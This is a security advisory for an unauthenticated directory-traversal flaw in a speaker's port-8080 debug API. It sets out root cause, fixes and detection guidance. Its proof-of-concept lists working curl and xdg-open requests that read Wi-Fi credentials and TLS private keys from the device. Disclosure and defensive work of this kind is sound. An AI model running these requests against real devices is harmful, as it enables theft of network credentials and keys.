# High Level Overview and possible effect

- An unauthenticated attacker on the local network can download arbitrary files from the configuration (/data) partition on the device, including Wifi credentials and TLS certificate key files
- An unauthenticated attacker on the local network can alter the volume on the device

IMPORTANT: this is _not_ the well known vulnerability (or "intended behaviour" depending on who you ask) of chromecast devices on port 8008, 8009 or 8443 exposing functional device information . This vulnerability is on a different TCP port, 8080, that is not normally needed on such devices and exposes other sensitive information, although presumably those other services could be leveraged in conjunction.

- 	An unauthenticated user with access to the local network (presumably through means other than the same wifi network the device is paired to) can read the hashed wpa_supplicant wireless passphrase, and use this or share this to gain access to the wireless network the device is connected to without knowing the actual passphrase. 
- An unauthenticated user with access to the local network can read device private TLS keys and I speculate they could use this information to pretend to be the device and execute unintended operations on behalf of connected users 
- Other files include what appear to be audio recordings of unknown heritage, so I speculate that an unauthenticated user with access to the local network might be able to read user personal information from voice recordings, although further research is needed.
- This vulnerability could be coupled with other vulnerabilities to expedite further attacks
- The other exposed API effects appear to be inconsequential minor DoS (e.g set volume to 0, change power off duration beaviour) included for completeness

# Root Cause Analysis

## Detailed Description 

There are multiple processes that run, including a process called `autotools_daemon` that exposes a HTTP API on port 8080. Most of the calls appear to be insignificant debugging information such as the device serial number, or provide the ability to modify the volume of the device, however there is a directory traversal that provides read access to all files on the /data partition.

The `autotools_daemon` process uses a version of the mongoose open source HTTP library, and when the code that processes the API requests handles unknown  requests if the request is formed with two backslashes it will either return a directory listing relative to the process working directory (`/data`) or retrieve the file at that location on `/data`

## Code flow from input to the vulnerable condition 

The code appears to follow a typical Mongoose API pattern, e.g. `mg_http_listen(event_handler)` calls a handler that processes GET/POST and the URL fragments

`event_handler` checks if the request is a GET or a POST and from there inspects the URL fragment for a known command by calling a subfunction, `FUN_26704()`. `FUN_26704()` will return `-1` if the API method is not known, in which `case mg_serve_http()` is called, which serves directories and files from the working directory of the process. The error is probably an edge condition somewhere in `FUN_26704()` which I have not bothered to fully analyse; the problem occurs because instead of calling `mg_serve_http()` it should instead return a `404`.

## Buffer Size, Injection Point, etc. 

The event handler for the mongoose http server on port 8080 processes HTTP requests incorrectly in the context of the `autotools_daemon` process, in working directory `/data`

# Proof-of-Concept

Execute a request from another host on the same subnet with two forward slashes at the end after .. to fetch the root, or the start to fetch a file. Examples follow.

Fetch the root directory listing from /data on the device:

```
curl --path-as-is http://$SPEAKER_IP:8080/api/..//
```

Fetch the root directory listing from /data on the device, using the default Linux web browser:

```
xdg-open http://$SPEAKER_IP:8080/anyjunk/..//
```

Fetch the wpa_supplicant.conf file from /data on the device, using the default Linux web browser (file wont be present if device in factory reset mode):

```
xdg-open http://$SPEAKER_IP:8080//wifi/wpa_supplicant.conf
```

Fetch key pair of to-be-determined purpose (probably related to casting) from the device, using curl:

```
curl --path-as-is http://$SPEAKER_IP:8080//factory/client.key.bin
curl --path-as-is http://$SPEAKER_IP:8080//factory/client.crt
```

For comparison: this next is handled reasonably and will return same as a `"device_info"` GET (see below):

```
curl --path-as-is http://$SPEAKER_IP:8080/
```

For comparison: unknown function is handled reasonably and will return an error response

```
curl --path-as-is http://$SPEAKER_IP:8080/junk
```


## Suggested fixes 

Do not call `mg_serve_http()` when the API parser returns an error code (-1), there is no need to serve files from the device. CWE-1164 Irrelevant code

Higher level: do not expose this API at all, it is not needed for operation as a cast device. If it is required for internal use, bind to `127.0.0.1` CWE-1327 Binding to an Unrestricted IP Address

# Detection Guidance

Scan for unauthorised chromecast devices and audit authorised devices, and look for open ports that are not standard chromecast ports such as 8008, 8009, 8443... these should probably not be on the same network as high value intellectual property.
